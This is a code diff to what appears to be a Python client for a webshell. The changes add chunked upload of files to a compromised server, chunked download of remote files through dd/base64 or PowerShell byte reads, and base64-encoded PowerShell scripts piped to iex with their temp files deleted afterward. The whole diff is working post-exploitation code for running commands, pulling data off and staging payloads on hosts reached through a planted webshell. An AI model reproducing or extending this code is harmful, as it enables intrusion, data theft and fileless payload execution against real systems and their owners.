@@ -15,6 +15,7 @@ remote_files = []
 autocomplete_pending = False
 urllib3.disable_warnings()
 TAG_RE = re.compile(r'<[^>]+>')
+CHUNK_SIZE = 65536
 neotermcolor.readline_always_safe = True
 
 error_patterns = [
@@ -355,7 +356,11 @@ if __name__ == "__main__":
                                         ps1_content = f.read()
                                     filename = os.path.basename(localfile)
                                     base64_content = base64.b64encode(ps1_content.encode('utf-8')).decode('utf-8')
-                                    ps_command = f"[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{base64_content}')) | iex"
+                                    ps1_tmp = path.rstrip() + "\\" + filename + ".b64"
+                                    for i in range(0, len(base64_content), CHUNK_SIZE):
+                                        chunk = base64_content[i:i + CHUNK_SIZE]
+                                        send_command(PIPE + "echo" + space + "'" + chunk + "'" + space + ">>" + space + ps1_tmp, WEBSHELL, HTTP_METHOD, PARAM)
+                                    ps_command = "$s=(gc '" + ps1_tmp + "') -join '';[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($s)) | iex; Remove-Item '" + ps1_tmp + "' -Force"
                                     result = send_command(PIPE + ps_command, WEBSHELL, HTTP_METHOD, PARAM)
                                     if is_error_output(result):
                                         print(colored(f"[!] Error executing script: {result}\n", "red"))
@@ -409,18 +414,22 @@ if __name__ == "__main__":
                             except OSError:
                                 print(colored("[!] Local file " + localfile + " does not exist!\n", "red"))
                                 continue
-                            upload = send_command(PIPE + "echo" + space + str(base64data.rstrip(), "utf8") + space +
-                            ">" + space + remotefile, WEBSHELL, HTTP_METHOD, PARAM)
+                            upload_tmp = remotefile.rstrip() + ".b64"
+                            b64data = base64data.decode("utf8")
+                            for i in range(0, len(b64data), CHUNK_SIZE):
+                                chunk = b64data[i:i + CHUNK_SIZE]
+                                send_command(PIPE + "echo" + space + "'" + chunk + "'" + space + ">>" + space + upload_tmp, WEBSHELL, HTTP_METHOD, PARAM)
+                            
+                            if system == "linux":
+                                upload = send_command(PIPE + "base64" + space + "-di" + space + upload_tmp + space + ">" + space + remotefiletmp + space +
+                                ";rm" + space + "-f" + space + upload_tmp + ";mv" + space + remotefiletmp + space + remotefile, WEBSHELL, HTTP_METHOD, PARAM)
+                            else:
+                                upload = send_command(PIPE + "$base64 = cat -Encoding UTF8 " + upload_tmp + " ; [System.Convert]::FromBase64String(($base64 -join '')) | Set-Content -Encoding Byte " + remotefile + " ; Remove-Item " + upload_tmp + " -Force", WEBSHELL, HTTP_METHOD, PARAM)
                             
                             if is_error_output(upload):
                                 print(colored(f"[!] Error uploading file: {upload}\n", "red"))
                             else:
-                                if system == "linux":
-                                    send_command(PIPE + "base64" + space + "-di" + space + remotefile + space + ">" + space + remotefiletmp + space +
-                                    ";rm" + space + "-f" + space + remotefile + ";mv" + space + remotefiletmp + space + remotefile, WEBSHELL, HTTP_METHOD, PARAM)
-                                if system == "windows":
-                                    command = " ; [System.Convert]::FromBase64String($base64) | Set-Content -Encoding Byte "
-                                    send_command(PIPE + "$base64 = cat -Encoding UTF8 " + remotefile + command + remotefile, WEBSHELL, HTTP_METHOD, PARAM)
+                                print(colored(f"[+] Uploaded {remotefile} successfully!\n", "green"))
                     else:
                         if "download" in command.split()[0]: 
                             if IFS:
@@ -441,31 +450,38 @@ if __name__ == "__main__":
                                 else:
                                     print(colored("[+] Downloading file " + remotefile + " on " + localfile + "..\n", "green"))
                                 try:
-                                    if system == "linux":
-                                        base64data = send_command(PIPE + "base64" + space + remotefile, WEBSHELL, HTTP_METHOD, PARAM) 
-                                    if system == "windows":
-                                        command = "[Convert]::ToBase64String([IO.File]::ReadAllBytes('"+remotefile+"'))" 
-                                        base64data = send_command(PIPE + command, WEBSHELL, HTTP_METHOD, PARAM)
+                                    f = open(localfile, "wb")
+                                    chunk_index = 0
+                                    while True:
+                                        if system == "linux":
+                                            cmd = "dd" + space + "if='" + remotefile + "'" + space + "bs=" + str(CHUNK_SIZE) + space + "skip=" + str(chunk_index) + space + "count=1" + space + "2>/dev/null" + space + "|" + space + "base64" + space + "-w0"
+                                        else:
+                                            start = str(chunk_index * CHUNK_SIZE)
+                                            cmd = "$b=New-Object byte[] " + str(CHUNK_SIZE) + ";$f=[IO.File]::OpenRead('" + remotefile + "');$f.Seek(" + start + ",[IO.SeekOrigin]::Begin)|Out-Null;$r=$f.Read($b,0," + str(CHUNK_SIZE) + ");$f.Close();if($r -gt 0){[Convert]::ToBase64String($b[0..($r-1)])}"
+                                        base64data = send_command(PIPE + cmd, WEBSHELL, HTTP_METHOD, PARAM)
+                                        if NOPRE:
+                                            base64data = "<pre>" + base64data + "</pre>"
+                                        if "<pre>" in base64data:
+                                            base64data = str(base64data).split("<pre>", 1)[1] ; base64data = str(base64data).split("</pre>", 1)[0]
+                                            base64data = remove_html(base64data)
+                                        if is_error_output(base64data):
+                                            print(colored(f"[!] Error downloading file: {base64data}\n", "red"))
+                                            f.close()
+                                            break
+                                        if not base64data:
+                                            break
+                                        download = base64.b64decode(base64data.encode("utf8") + b"========")
+                                        f.write(download)
+                                        chunk_index += 1
+                                    f.close()
                                 except KeyboardInterrupt:
                                     print("\n")
                                     continue
-                                
-                                if NOPRE:
-                                    base64data = "<pre>" + base64data + "</pre>"
-                                if "<pre>" in base64data:
-                                    base64data = str(base64data).split("<pre>", 1)[1] ; base64data = str(base64data).split("</pre>", 1)[0]
-                                    base64data = remove_html(base64data)
-                                
-                                if is_error_output(base64data):
-                                    print(colored(f"[!] Error downloading file: {base64data}\n", "red"))
-                                    continue
-                                
-                                download = base64.b64decode(base64data.encode("utf8") + b"========")
-                                try:
-                                    f = open(localfile, "wb") ; f.write(download) ; f.close()
                                 except OSError:
                                     print(colored("[!] Error writing " + localfile + ", check path and perms!\n", "red"))
                                     continue
+                                else:
+                                    print(colored(f"[+] Downloaded {localfile} successfully!\n", "green"))
                         else:
                             if "pwd" in command.split()[0]:
                                 path = str(path) + "\n"
